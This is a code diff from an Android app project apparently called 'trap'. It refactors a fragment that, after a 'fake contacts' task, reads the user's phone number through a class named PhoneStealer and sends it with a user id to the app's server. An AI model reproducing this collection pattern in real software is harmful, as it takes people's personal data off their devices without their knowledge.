@@ -12,10 +12,10 @@ import android.view.ViewGroup;
 import android.widget.Button;
 
 import androidx.fragment.app.Fragment;
+
 import de.hpi3d.gamepgrog.trap.R;
 import de.hpi3d.gamepgrog.trap.android.PhoneStealer;
-import de.hpi3d.gamepgrog.trap.api.ApiIntent;
-import de.hpi3d.gamepgrog.trap.api.ApiService;
+import de.hpi3d.gamepgrog.trap.api.ApiManager;
 import de.hpi3d.gamepgrog.trap.api.StorageManager;
 import de.hpi3d.gamepgrog.trap.future.Promise;
 import de.hpi3d.gamepgrog.trap.tasks.FakeContactsTaskResolver;
@@ -121,12 +121,7 @@ public class ButtonsFragment extends Fragment {
         resolver.executeAndShowResult(getActivity(), contactsTask).then(() -> {
             String number = PhoneStealer.getUserPhoneNumber(getContext());
             StorageManager.with(getActivity()).phoneNumber.set(number);
-            ApiIntent
-                    .build(getContext())
-                    .setCall(ApiService.CALL_PHONENUMBER)
-                    .put(ApiService.KEY_USER_ID, userid)
-                    .put(ApiService.KEY_PHONENUMBER, number)
-                    .start();
+            ApiManager.api(getActivity()).sendPhoneNumber(userid, number).call();
 
             p.resolve(true);
         });
